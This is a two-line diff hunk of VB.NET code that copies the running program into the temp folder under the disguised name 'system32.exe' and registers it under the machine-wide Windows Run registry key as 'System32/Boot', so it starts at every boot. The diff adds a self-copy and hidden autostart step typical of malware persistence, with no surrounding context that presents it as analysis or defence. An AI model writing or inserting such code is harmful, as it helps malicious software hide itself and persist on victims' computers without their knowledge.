@@ -1,0 +1,2 @@
+IO.File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, IO.Path.GetTempPath & "system32.exe")
+My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("System32/Boot", IO.Path.GetTempPath & "system32.exe")
